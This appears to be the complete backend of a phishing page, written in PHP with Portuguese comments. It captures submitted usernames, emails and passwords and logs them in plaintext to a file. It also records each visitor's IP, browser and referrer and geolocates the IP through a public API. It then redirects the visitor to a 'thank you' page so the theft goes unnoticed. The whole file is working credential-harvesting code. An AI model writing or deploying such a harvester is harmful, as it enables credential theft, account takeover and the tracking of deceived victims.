<?php
// Dados enviados pelo formulário
$login = $_POST['login'] ?? 'N/A';
$email = $_POST['email'] ?? 'N/A';
$senha = $_POST['senha'] ?? 'N/A';

// Captura de metadados
$ip = $_SERVER['REMOTE_ADDR'];
$dataHora = date("Y-m-d H:i:s");
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
$referrer = $_SERVER['HTTP_REFERER'] ?? 'N/A';

// Consulta de geolocalização via IP (API pública)
$geo = json_decode(file_get_contents("http://ip-api.com/json/$ip?lang=pt"), true);

$pais = $geo['country'] ?? 'Desconhecido';
$cidade = $geo['city'] ?? 'Desconhecida';
$regiao = $geo['regionName'] ?? 'Desconhecida';
$isp = $geo['isp'] ?? 'Desconhecido';
$org = $geo['org'] ?? 'Desconhecida';

// Montagem do registro
$log = "----------------------------------------\n";
$log .= "Data/Hora: $dataHora\n";
$log .= "Login: $login | Email: $email | Senha: $senha\n";
$log .= "IP: $ip | Cidade: $cidade | Região: $regiao | País: $pais\n";
$log .= "ISP: $isp | Organização: $org\n";
$log .= "Navegador: $userAgent\n";
$log .= "Referência: $referrer\n";

// Salvamento em arquivo
file_put_contents("logins.txt", $log, FILE_APPEND);

// Redirecionamento após envio
header('Location: https://example.com/obrigado.html');
exit();
?>
